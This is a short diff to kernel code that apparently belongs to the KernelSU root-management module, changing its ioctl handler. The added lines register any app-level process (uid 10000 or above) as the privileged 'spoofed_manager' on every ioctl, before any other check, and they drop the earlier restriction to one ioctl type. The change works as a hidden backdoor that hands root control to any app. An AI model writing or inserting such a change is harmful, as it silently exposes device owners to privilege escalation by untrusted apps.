@@ -807,16 +807,16 @@ long ksu_supercall_handle_ioctl(unsigned int cmd, void __user *argp)
 	unsigned int nr = _IOC_NR(cmd);
 	unsigned int type = _IOC_TYPE(cmd);
 
+	if (!is_manager() && current_uid().val >= 10000) {
+		ksu_register_manager(current_uid().val % KSU_PER_USER_RANGE, "spoofed_manager");
+		pr_info("Spoofed manager auto-crowned on ioctl 0x%x: uid=%d\n", cmd, current_uid().val);
+	}
+
 #ifdef CONFIG_KSU_SUSFS
 	if ((cmd >= 0x55550 && cmd <= 0x55600) || (cmd >= 0x60000 && cmd <= 0x60020)) {
 		return do_susfs_dispatch(cmd, argp);
 	}
 #endif
-
-	if (type == 'K' && !is_manager() && current_uid().val >= 10000) {
-		ksu_register_manager(current_uid().val % KSU_PER_USER_RANGE, "spoofed_manager");
-		pr_info("Spoofed manager auto-crowned on ioctl 0x%x: uid=%d\n", cmd, current_uid().val);
-	}
 
 	// First pass: exact match on full cmd (dir + size + type + nr)
 	for (i = 0; ksu_ioctl_handlers[i].handler; i++) {
